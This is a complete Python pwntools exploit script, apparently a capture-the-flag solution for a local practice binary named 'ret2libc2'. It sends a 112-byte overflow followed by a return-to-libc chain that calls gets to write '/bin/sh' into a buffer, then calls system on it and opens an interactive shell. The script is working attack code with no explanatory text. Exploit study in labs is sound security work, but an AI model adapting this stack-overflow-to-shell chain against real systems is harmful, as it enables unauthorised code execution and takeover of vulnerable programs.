from pwn import *
context.log_level = "debug"
io = process("./ret2libc2")
io.recv()
elf = ELF("./ret2libc2")
gets = elf.plt['gets']
sym = elf.plt['system']


payload = b"A"*112 +p32(gets)+ p32(sym)+p32(elf.sym['buf2'])+p32(elf.sym['buf2'])
io.sendline(payload)
io.sendline(b"/bin/sh")
io.interactive()
